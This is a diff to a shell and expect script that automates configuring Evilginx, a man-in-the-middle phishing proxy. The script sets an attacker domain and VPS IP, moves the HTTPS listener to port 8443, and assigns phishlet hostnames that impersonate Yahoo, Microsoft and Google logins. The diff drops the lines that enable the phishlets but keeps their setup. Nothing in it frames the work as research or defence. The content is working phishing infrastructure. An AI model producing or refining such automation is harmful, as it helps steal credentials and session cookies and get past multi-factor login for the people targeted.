@@ -617,34 +617,30 @@ EOF
     # Use expect for interactive configuration
     cat > /tmp/evilginx_config.exp << EOF
 #!/usr/bin/expect -f
-set timeout 10
+set timeout 45
 log_user 1
 
 spawn /usr/local/bin/evilginx -c $EVILGINX_DIR -p $EVILGINX_DIR/phishlets
 
 expect {
-    -re "evilginx\s+>\s?$" { # Wait for the prompt
-        # Core config (domain, IP, ports) are now read from config.yaml
-        # Only phishlet-specific commands are sent interactively
-        send "config domain $DOMAIN\r" # Ensure domain is set in DB
-        expect -re "evilginx\s+>"
-        send "config ipv4 external $VPS_IP\r" # Ensure external IP is set in DB
-        expect -re "evilginx\s+>"
-
+    "successfully set up all TLS certificates" {
+        # Banner is done, listeners are up. Now we configure.
+        expect -re "evilginx\s+>\s*$"
+        
+        send "config domain $DOMAIN\r"
+        expect -re "evilginx\s+>\s*$"
+        send "config ipv4 external $VPS_IP\r"
+        expect -re "evilginx\s+>\s*$"
+        send "config https_port 8443\r"
+        expect -re "evilginx\s+>\s*$"
+        
         # Enable phishlets
         send "phishlets hostname yahoo $EP1.$DOMAIN\r"
-        expect -re "evilginx\s+>"
+        expect -re "evilginx\s+>\s*$"
         send "phishlets hostname microsoft $EP2.$DOMAIN\r"
-        expect -re "evilginx\s+>"
+        expect -re "evilginx\s+>\s*$"
         send "phishlets hostname google $EP3.$DOMAIN\r"
-        expect -re "evilginx\s+>"
-        
-        send "phishlets enable yahoo\r"
-        expect -re "evilginx\s+>"
-        send "phishlets enable microsoft\r"
-        expect -re "evilginx\s+>"
-        send "phishlets enable google\r"
-        expect -re "evilginx\s+>"
+        expect -re "evilginx\s+>\s*$"
         
         send "exit\r"
     }
